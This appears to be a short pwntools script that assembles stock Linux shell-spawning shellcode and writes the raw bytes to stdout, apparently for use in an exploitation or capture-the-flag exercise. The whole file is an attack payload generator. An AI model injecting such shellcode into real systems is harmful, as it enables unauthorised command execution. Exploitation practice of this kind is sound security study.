from pwn import *
import sys

sys.stdout.buffer.write(asm(shellcraft.sh()))